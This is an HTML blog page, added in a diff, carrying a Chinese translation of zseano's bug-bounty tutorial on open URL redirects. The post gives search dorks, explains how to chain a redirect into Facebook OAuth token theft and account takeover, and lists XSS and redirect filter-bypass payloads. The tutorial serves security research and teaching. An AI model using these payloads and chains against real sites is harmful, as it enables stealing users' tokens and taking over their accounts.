@@ -1,0 +1,699 @@
+<!doctype html>
+<html class="theme-next use-motion theme-next-mist">
+<head>
+  
+
+<meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+
+
+
+  <link rel="stylesheet" type="text/css" href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5"/>
+
+
+<link rel="stylesheet" type="text/css" href="/css/main.css?v=0.4.3"/>
+
+
+    <meta name="description" content="关于计算机科学的学习经历与精彩文章分享。" />
+
+
+
+  <meta name="keywords" content="渗透测试," />
+
+
+
+
+
+  <link rel="shorticon icon" type="image/x-icon" href="/favicon.ico?v=0.4.3" />
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var CONFIG = {
+    scheme: 'Mist',
+    analytics: {
+      google: ''
+    },
+    sidebar: 'post'
+  };
+</script>
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?351a523b2429a0dda1b90bb708a00fad";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+  <title> zseano 漏洞赏金猎人系列教程 开放URL重定向 // Neurohazard </title>
+</head>
+
+<body>
+  <!--[if lte IE 8]>
+  <div style=' clear: both; height: 59px; padding:0 0 0 15px; position: relative;margin:0 auto;'>
+    <a href="http://windows.microsoft.com/en-US/internet-explorer/products/ie/home?ocid=ie6_countdown_bannercode">
+      <img src="http://7u2nvr.com1.z0.glb.clouddn.com/picouterie.jpg" border="0" height="42" width="820"
+           alt="You are using an outdated browser. For a faster, safer browsing experience, upgrade for free today or use other browser ,like chrome firefox safari."
+           style='margin-left:auto;margin-right:auto;display: block;'/>
+    </a>
+  </div>
+<![endif]-->
+
+  <div class="container one-column page-post-detail">
+    <div class="headband"></div>
+
+    <div id="header" class="header">
+      <div class="header-inner">
+        <h1 class="site-meta">
+  <span class="logo-line-before"><i></i></span>
+  <a href="/" class="brand">
+      <span class="logo">
+        <i class="icon-logo"></i>
+      </span>
+      <span class="site-title">Neurohazard</span>
+  </a>
+  <span class="logo-line-after"><i></i></span>
+</h1>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<div class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu ">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/">
+            <i class="menu-item-icon icon-home"></i> <br />
+            首頁
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about">
+            <i class="menu-item-icon icon-about"></i> <br />
+            關於
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives">
+            <i class="menu-item-icon icon-archives"></i> <br />
+            歸檔
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags">
+            <i class="menu-item-icon icon-tags"></i> <br />
+            標籤
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-friend">
+          <a href="/friend">
+            <i class="menu-item-icon icon-friend"></i> <br />
+            友情鏈接
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-reading-list">
+          <a href="/reading-list">
+            <i class="menu-item-icon icon-reading-list"></i> <br />
+            閱讀清單
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+</div>
+
+
+      </div>
+    </div>
+
+    <div id="main" class="main">
+      <div class="main-inner">
+        <div id="content" class="content">
+          
+
+  <div id="posts" class="posts-expand">
+    
+
+  <div class="post post-type-normal ">
+    <div class="post-header">
+
+      
+      
+        <h1 class="post-title">
+          
+          
+            
+              zseano 漏洞赏金猎人系列教程 开放URL重定向
+            
+          
+        </h1>
+      
+
+      <div class="post-meta">
+        <span class="post-time">
+          發表於 2017-12-25
+        </span>
+
+        
+          <span class="post-category">
+            &nbsp; | &nbsp; 分類於
+            
+              <a href="/categories/信息安全/">信息安全</a>
+
+              
+              
+
+            
+          </span>
+        
+
+        
+          
+            <span class="post-comments-count">
+            &nbsp; | &nbsp;
+            <a href="/2017/12/25/bug-hunter-tutorial-zseano/#comments" >
+              <span class="post-comments-count ds-thread-count" data-thread-key="2017/12/25/bug-hunter-tutorial-zseano/"></span>
+            </a>
+          </span>
+          
+        
+      </div>
+    </div>
+
+    <div class="post-body">
+
+      
+      
+
+      
+        <p>zseano 07v8论安全<br>跟zseano大牛一起做漏洞赏金猎人系列教程之教程一：开放 URL 重定向<br>本系列教程编译自漏洞赏金项目大牛@zseano的博客：<a href="https://zseano.com" target="_blank" rel="external">https://zseano.com</a></p>
+<p><a href="https://zseano.com/tutorials/1.html" target="_blank" rel="external">https://zseano.com/tutorials/1.html</a></p>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>@zseano是一位来自英国的安全研究者，在漏洞赏金平台Bugcrowd有着不错的成绩（目前排名第2）。他擅长Web渗透测试，目前也活跃在Hackerone和Synack等平台。他自己这样说道：我喜欢帮助别人，因为每个人的目的都是不同的，所以我觉得跟他人合作来获得一些很酷的新想法是非常有趣的。我对保护这个互联网世界充满了热情。</p>
+<p>个人觉得@zseano真的挺棒的，首先技术实力没得说，其次能够把好的想法以及自己的一些经验分享给大家，不仅符合黑客的侠义精神，还能推动大家一起做好安全这件事，为他点赞！</p>
+<p>下面是一些@zseano写的帮助其他研究人员挖掘漏洞的教程。 这里面讨论了各种主题，例如通过FacebookOauth和公共区域更改开放的URL重定向到账户接管，以发现IDOR（不安全的直接对象引用）漏洞。他本人计划发布更多教程，所以感兴趣的伙伴请记得常去访问他的博客哟。</p>
+<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p><a href="https://www.example.com/?go=https://www.google.com/" target="_blank" rel="external">https://www.example.com/?go=https://www.google.com/</a></p>
+<p>嗯，让我们开始实战吧！找一个开放URL重定向和一个常见的地方试试。我们试试在Google里面使用site:example.com inurl:redirect，看看能发现什么。当然，我们还能使用更多的普通重定向词语，比如<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="string">site:</span>example.com <span class="string">inurl:</span>redirect</div><div class="line"><span class="string">inurl:</span>go, </div><div class="line"><span class="string">inurl:</span><span class="keyword">return</span>, </div><div class="line"><span class="string">inurl:</span>returnTo</div><div class="line"><span class="string">inurl:</span>redirect</div></pre></td></tr></table></figure></p>
+<p>什么都没发现？别灰心，让我们从目标站点开始并看看常见的地方。从我的经验来看，容易出现该漏洞的地方通常是这些页面：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">login, register, <span class="built_in">logout</span>, </div><div class="line">changesite language, links <span class="keyword">in</span> emails</div></pre></td></tr></table></figure>
+<p>假设这次我们起码能找到一处开放URL重定向，如果没有，那就继续找下去！;)现在我们找到一处漏洞，是该立马提交还是用它来干点其他的事呢？从我的经验来看，我总是会继续深入，所以建议你也这样做！以下是一些能用该漏洞继续升入挖掘的常见手段：</p>
+<ol>
+<li>开放URL跳转 -&gt; 通过错误配置的Facebook客户端窃取Facebook Oauth令牌（凭证）</li>
+<li>开放URL跳转 -&gt; 使用Facebook接入令牌来接管(第三方)账户</li>
+<li>开放URL跳转 -&gt; DOM XSS  </li>
+</ol>
+<h2 id="通过错误配置的Facebook客户端窃取Facebook-Oauth令牌（凭证）"><a href="#通过错误配置的Facebook客户端窃取Facebook-Oauth令牌（凭证）" class="headerlink" title="通过错误配置的Facebook客户端窃取Facebook Oauth令牌（凭证）"></a>通过错误配置的Facebook客户端窃取Facebook Oauth令牌（凭证）</h2><p>Facebook通过使用类似 <code>appsecret_proof</code> 这种功能，在保护用户的接入令牌（<code>access_token</code>）方面做得很不错，但是很遗憾，用户基本不去使用这项功能。在黑客眼里，Facebook的Oauth系统相当简单：提供一个客户端ID（<code>client_id</code>）和一个白名单中的重定向URI（<code>redirect_uri</code>）即可获得令牌（<code>token</code>）。</p>
+<p>案例：<br><a href="https://www.facebook.com/dialog/oauth?client_id=388795771235143&amp;response_type=token&amp;redirect_uri=https://www.cbssports.com/&amp;scope=email" target="_blank" rel="external">https://www.facebook.com/dialog/oauth?client_id=388795771235143&amp;response_type=token&amp;redirect_uri=https://www.cbssports.com/&amp;scope=email</a></p>
+<p>注解：使用&amp;response_type=code或response_type=token能实现不同的结果。</p>
+<p>想象一下，在zseano.cbssports.com这个站点上我们发现了一处开放URL重定向。如果我们输入&amp;redirect_uri=<a href="https://zseano.cbssports.com/并且被它接受了——那就太好了！如果没有被接受，也别灰心，试试https://www.cbssports.com/test/" target="_blank" rel="external">https://zseano.cbssports.com/并且被它接受了——那就太好了！如果没有被接受，也别灰心，试试https://www.cbssports.com/test/</a> 这种。如果仍然不行，那么说明这个站点是安全的。但是能行，那么只能是<a href="http://www.cbssports.com/*这种。" target="_blank" rel="external">http://www.cbssports.com/*这种。</a><br>现在我来讲一下在Facebook的Oauth系统这个案例中用到的技巧。如果你给Facebook提供一个&amp;redirect_uri=<a href="https://zseano.cbssports.com/?goto=https://www.google.com/" target="_blank" rel="external">https://zseano.cbssports.com/?goto=https://www.google.com/</a> ，那么它不会跟着重定向到你的站点（也就是你用来窃取他们Oauth令牌的站点）。</p>
+<p>说好的技巧呢？URL编码。没错，如果我们给Facebook 添加&amp;</p>
+<p>redirect_uri=https%3A%2F%2Fzseano.cbssports.com%2F%3Fgoto%3Dhttps%3A%2F%2Fwww.google.com%2F，那么它就会跟着重定向到你的站点，这样你就可以收获他们的fb Oauth令牌啦！:)<br>那么FB Oauth令牌能干嘛呢？根据Facebook的说明，可以做很多事。我们可以查询他们的邮件，在涂鸦墙上发帖（如果有正确的权限），反正一大堆。因为他们访问我们的站点，我们就可以窃取他们用户的邮件，那么我们的开放URL重定向是不是就有意义了呢？</p>
+<h2 id="使用Facebook接入令牌来接管-第三方-账户"><a href="#使用Facebook接入令牌来接管-第三方-账户" class="headerlink" title="使用Facebook接入令牌来接管(第三方)账户"></a>使用Facebook接入令牌来接管(第三方)账户</h2><p>这个漏洞不仅是能查询他们Facebook信息那么简单。用你的手机看看这个站点是不是还有一个APP，9成的APP都有一个“使用Facebook登录”的按钮并且从我的经验来看，使用他们的FB app登录（包括注册）时，他们会做以下的事：</p>
+<ul>
+<li>获取我的Facebook接入令牌</li>
+<li>将其发送到他们的服务器并交换不记名令牌</li>
+<li>在所有的调用（基本上是我的会话）中使用这个令牌<br>那么你一直跟着我看到这里了吗？我测试过的APP基本上允许我将用户重定向到Facebook oauth对话框屏幕，重定向到我的网站并劫持他的令牌，然后查询实际站点的移动api系统作为……的交换令牌，你猜对了，受害者帐户。<br>其他值得看看的常见地方是“关联”到Facebook账户的账户设置。</li>
+</ul>
+<p>所以，我们刚刚将一个“无害的”开放URL重定向变成了一个能接入受害者账户的权限。当然每个开放URL重定向都不同，但这是我经常关注的关键部位（而且一般都能成功！）。</p>
+<h2 id="还能做其他的吗？"><a href="#还能做其他的吗？" class="headerlink" title="还能做其他的吗？"></a>还能做其他的吗？</h2><p>开放URL重定向在一些方面也能用来XSS攻击。让我们探讨一下下面的案例。</p>
+<p>如你所见，我们首先找到一处开放URL重定向，而且能执行XSS攻击。如果我们输入”;alert(0);// 会发生什么呢？（我们使用”;来结束varredirectToUrl=””;变量，然后使用 // 注释掉最后的”;—如果不是JavaScript就只能抱怨了。在一般的脚本标签上使用这个也能绕过chrome的xss auditor :D）</p>
+<p>耶！成功啦！ :D.<br>使用原来的 ?redirect=javascript:alert(0); 有时候也能起作用，尤其是遇到SWF文件的时候。（site: example.com inurl:?clickTag=ext:swf 就是最常见的一个！）</p>
+<h1 id="绕过过滤器-Filter-的方法"><a href="#绕过过滤器-Filter-的方法" class="headerlink" title="绕过过滤器(Filter)的方法"></a>绕过过滤器(Filter)的方法</h1><p>使用原来的 ?redirect=javascript:alert(0); 有时候也能起作用，尤其是遇到SWF文件的时候。（site: example.com inurl:?clickTag=ext:swf 就是最常见的一个！）</p>
+<p>绕过过滤器的方法<br>每个开放URL重定向都不同，但是这里是一些我成功执行重定向 / XSS 的payload。</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">java%0d%0ascript%0d%0a:alert(<span class="number">0</span>)</div><div class="line">（用crlf攻击来绕过JavaScript：被加入黑名单） </div><div class="line">//google.com</div><div class="line">（以防http:<span class="regexp">//</span> 被加入黑名单）</div><div class="line">https:google.com</div><div class="line">（在浏览器接受的情况下，如果 // 被加入黑名单，那么用这个就很棒！）</div><div class="line">//google%E3%80%82com</div><div class="line">（%E3%80%82是。的编码。十分感谢filedescriptor向我展示这个。）</div><div class="line">\/\/google.com/</div><div class="line">（对于绕过// http:<span class="regexp">//</span>黑名单十分有效。浏览器把\/\/看作是//） </div><div class="line">/\/google.com/</div><div class="line">（同上） </div><div class="line">//google%00.com</div><div class="line">（null 字节在任何地方都能用来绕过黑名单过滤器） </div><div class="line">http:<span class="regexp">//www</span>.theirsite.com@yoursite.com/</div><div class="line">（老掉牙啦，但是浏览器会重定向到@后面的任何东西）</div><div class="line">http:<span class="regexp">//www</span>.yoursite.com/http:<span class="regexp">//www</span>.theirsite.com/</div><div class="line">（如果@被加入到黑名单而且他们还检查了他们的域名是否在参数里，那么久建一个目录作为他们的域名 :D）</div><div class="line"><span class="string">";alert(0);//</span></div><div class="line"><span class="string">（这是从上面的例子得来的。如果url在变量中响应而且我们想在脚本标签中执行xss的话。）</span></div></pre></td></tr></table></figure>
+<p>嗯……这样我们就达到了目的。我希望大家都能喜欢第一篇教程，并且从中学到一些关于开放URL重定向的新东西，并让他们变得有价值。</p>
+
+      
+    </div>
+
+    <div class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/渗透测试/"> #渗透测试 </a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/12/25/cobalt-strike-server/">Cobalt Strike 服务器搭建、维护与使用</a>
+            
+          </div>
+
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/12/24/introduction-to-backdoor/">php安全新闻早八点 高级持续渗透 第一季 关于后门与</a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </div>
+  </div>
+
+
+
+    
+      <div class="post-spread">
+        <!-- JiaThis Button BEGIN -->
+<div class="jiathis_style">
+  <a class="jiathis_button_tsina"></a>
+  <a class="jiathis_button_tqq"></a>
+  <a class="jiathis_button_weixin"></a>
+  <a class="jiathis_button_cqq"></a>
+  <a class="jiathis_button_douban"></a>
+  <a class="jiathis_button_renren"></a>
+  <a class="jiathis_button_qzone"></a>
+  <a class="jiathis_button_kaixin001"></a>
+  <a class="jiathis_button_copy"></a>
+  <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
+  <a class="jiathis_counter_style"></a>
+</div>
+<script type="text/javascript" >
+  var jiathis_config={
+    hideMore:false
+  }
+</script>
+<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js" charset="utf-8"></script>
+<!-- JiaThis Button END -->
+
+      </div>
+    
+
+    
+      <div class="comments" id="comments">
+        
+          <div class="ds-thread" data-thread-key="2017/12/25/bug-hunter-tutorial-zseano/"
+               data-title="zseano 漏洞赏金猎人系列教程 开放URL重定向" data-url="http://blkstone.github.io/2017/12/25/bug-hunter-tutorial-zseano/">
+          </div>
+        
+      </div>
+    
+  </div>
+
+
+        </div>
+
+        
+      </div>
+
+
+      
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目錄
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            本站概覽
+          </li>
+        </ul>
+      
+
+      <div class="site-overview">
+        <div class="site-author motion-element">
+          <img class="site-author-image" src="/images/avatar.jpg" alt="Ray" />
+          <p class="site-author-name">Ray</p>
+        </div>
+        <p class="site-description motion-element">关于计算机科学的学习经历与精彩文章分享。</p>
+        <div class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">511</span>
+              <span class="site-state-item-name">文章</span>
+            </a>
+          </div>
+
+          <div class="site-state-item site-state-categories">
+            
+              <span class="site-state-item-count">15</span>
+              <span class="site-state-item-name">分類</span>
+              
+          </div>
+
+          <div class="site-state-item site-state-tags">
+            <a href="/tags">
+              <span class="site-state-item-count">149</span>
+              <span class="site-state-item-name">標籤</span>
+              </a>
+          </div>
+
+        </div>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+              <a href="https://github.com/BLKStone" target="_blank">GitHub</a>
+            </span>
+            
+              <span class="links-of-author-item">
+              <a href="http://blkstone.github.io/" target="_blank">Twitter</a>
+            </span>
+            
+              <span class="links-of-author-item">
+              <a href="http://blkstone.github.io/" target="_blank">Weibo</a>
+            </span>
+            
+              <span class="links-of-author-item">
+              <a href="http://blkstone.github.io/" target="_blank">DouBan</a>
+            </span>
+            
+              <span class="links-of-author-item">
+              <a href="http://blkstone.github.io/" target="_blank">ZhiHu</a>
+            </span>
+            
+          
+        </div>
+
+        
+        
+          <div class="cc-license motion-element">
+            <a href="http://creativecommons.org/licenses/by-nc-sa/4.0" class="cc-opacity" target="_blank">
+              <img src="/images/cc-by-nc-sa.svg" alt="Creative Commons" />
+            </a>
+          </div>
+        
+
+      </div>
+
+      
+        <div class="post-toc-wrap sidebar-panel-active">
+          <div class="post-toc-indicator-top post-toc-indicator"></div>
+          <div class="post-toc">
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#正文"><span class="nav-number">2.</span> <span class="nav-text">正文</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#通过错误配置的Facebook客户端窃取Facebook-Oauth令牌（凭证）"><span class="nav-number">2.1.</span> <span class="nav-text">通过错误配置的Facebook客户端窃取Facebook Oauth令牌（凭证）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#使用Facebook接入令牌来接管-第三方-账户"><span class="nav-number">2.2.</span> <span class="nav-text">使用Facebook接入令牌来接管(第三方)账户</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#还能做其他的吗？"><span class="nav-number">2.3.</span> <span class="nav-text">还能做其他的吗？</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#绕过过滤器-Filter-的方法"><span class="nav-number">3.</span> <span class="nav-text">绕过过滤器(Filter)的方法</span></a></li></ol></div>
+            
+          </div>
+          <div class="post-toc-indicator-bottom post-toc-indicator"></div>
+        </div>
+      
+
+    </div>
+  </div>
+
+
+    </div>
+
+    <div id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">
+  
+  &copy; &nbsp;  2015 - 
+  2017
+  <span class="with-love">
+    <i class="icon-heart"></i>
+  </span>
+  <span class="author">Ray</span>
+</div>
+
+<div class="powered-by">
+  由 <a class="theme-link" href="http://hexo.io">Hexo</a> 強力驅動
+</div>
+
+<div class="theme-info">
+  主題 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Mist
+  </a>
+</div>
+
+
+
+      </div>
+    </div>
+
+    <div class="back-to-top"></div>
+  </div>
+
+  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+
+  
+  
+
+  
+  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js"></script>
+  <script type="text/javascript" src="/js/fancy-box.js?v=0.4.3"></script>
+
+
+  <script type="text/javascript" src="/js/helpers.js?v=0.4.3"></script>
+  
+
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js"></script>
+  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js"></script>
+
+  <script type="text/javascript" src="/js/motion_global.js?v=0.4.3" id="motion.global"></script>
+
+
+
+  <script type="text/javascript" src="/js/search-toggle.js"></script>
+
+  
+  
+<script type="text/javascript" src="/js/bootstrap.scrollspy.js?v=0.4.3" id="bootstrap.scrollspy.custom"></script>
+
+
+<script type="text/javascript" id="sidebar.toc.highlight">
+  $(document).ready(function () {
+    var tocSelector = '.post-toc';
+    var $tocSelector = $(tocSelector);
+    var activeCurrentSelector = '.active-current';
+
+    $tocSelector
+      .on('activate.bs.scrollspy', function () {
+        var $currentActiveElement = $(tocSelector + ' .active').last();
+
+        removeCurrentActiveClass();
+        $currentActiveElement.addClass('active-current');
+
+        $tocSelector[0].scrollTop = $currentActiveElement.position().top;
+      })
+      .on('clear.bs.scrollspy', function () {
+        removeCurrentActiveClass();
+      });
+
+    function removeCurrentActiveClass () {
+      $(tocSelector + ' ' + activeCurrentSelector)
+        .removeClass(activeCurrentSelector.substring(1));
+    }
+
+    function processTOC () {
+      getTOCMaxHeight();
+      toggleTOCOverflowIndicators();
+    }
+
+    function getTOCMaxHeight () {
+      var $sidebarInner = $('.sidebar-inner');
+      var height = $('.sidebar').height() -
+                   $tocSelector.position().top -
+                   $('.post-toc-indicator-bottom').height();
+
+      $tocSelector.css('height', height);
+
+      return height;
+    }
+
+    function toggleTOCOverflowIndicators () {
+      tocOverflowIndicator(
+        '.post-toc-indicator-top',
+        $tocSelector.scrollTop() > 0 ? 'show' : 'hide'
+      );
+
+      tocOverflowIndicator(
+        '.post-toc-indicator-bottom',
+        $tocSelector.scrollTop() >= $tocSelector.find('ol').height() - $tocSelector.height() ? 'hide' : 'show'
+      )
+    }
+
+    $(document).on('sidebar.didShow', function () {
+      processTOC();
+    });
+
+    $('body').scrollspy({ target: tocSelector });
+    $(window).on('resize', function () {
+      if ( $('.sidebar').hasClass('sidebar-active') ) {
+        processTOC();
+      }
+    });
+
+    onScroll($tocSelector);
+
+    function onScroll (element) {
+      element.on('mousewheel DOMMouseScroll', function (event) {
+          var oe = event.originalEvent;
+          var delta = oe.wheelDelta || -oe.detail;
+          var self = this;
+
+          this.scrollTop += ( delta < 0 ? 1 : -1 ) * 30;
+          event.preventDefault();
+
+          toggleTOCOverflowIndicators();
+      });
+    }
+
+    function tocOverflowIndicator (indicator, action) {
+      $(indicator).velocity('stop').velocity({
+        opacity: action === 'show' ? 0.4 : 0
+      }, { duration: 100 });
+    }
+
+  });
+</script>
+
+
+  <script type="text/javascript" id="sidebar.nav">
+    $(document).ready(function () {
+      var html = $('html');
+
+      $('.sidebar-nav li').on('click', function () {
+        var item = $(this);
+        var activeTabClassName = 'sidebar-nav-active';
+        var activePanelClassName = 'sidebar-panel-active';
+        if (item.hasClass(activeTabClassName)) {
+          return;
+        }
+
+        var currentTarget = $('.' + activePanelClassName);
+        var target = $('.' + item.data('target'));
+
+        currentTarget.velocity('transition.slideUpOut', 200, function () {
+          target
+            .velocity('stop')
+            .velocity('transition.slideDownIn', 200)
+            .addClass(activePanelClassName);
+        });
+
+        item.siblings().removeClass(activeTabClassName);
+        item.addClass(activeTabClassName);
+      });
+
+      $('.post-toc a').on('click', function (e) {
+        e.preventDefault();
+        var offset = $(escapeSelector(this.getAttribute('href'))).offset().top;
+        html.velocity('stop').velocity('scroll', {
+          offset: offset  + 'px',
+          mobileHA: false
+        });
+      });
+
+      // Expand sidebar on post detail page by default, when post has a toc.
+      var $tocContent = $('.post-toc-content');
+      if (isDesktop() && CONFIG.sidebar === 'post') {
+        if ($tocContent.length > 0 && $tocContent.html().trim().length > 0) {
+          displaySidebar();
+        }
+      }
+    });
+  </script>
+
+
+
+
+  <script type="text/javascript">
+    $(document).ready(function () {
+      if (CONFIG.sidebar === 'always') {
+        displaySidebar();
+      }
+    });
+  </script>
+
+  
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+      processEscapes: true,
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+  });
+</script>
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for (i=0; i < all.length; i += 1) {
+      all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+  });
+</script>
+
+<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+
+  
+  
+
+  
+    
+  
+
+  <script type="text/javascript">
+    var duoshuoQuery = {short_name:"blkstone"};
+    (function() {
+      var ds = document.createElement('script');
+      ds.type = 'text/javascript';ds.async = true;
+      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+      ds.charset = 'UTF-8';
+      (document.getElementsByTagName('head')[0]
+      || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+  </script>
+
+  
+
+
+  
+  
+
+</body>
+</html>
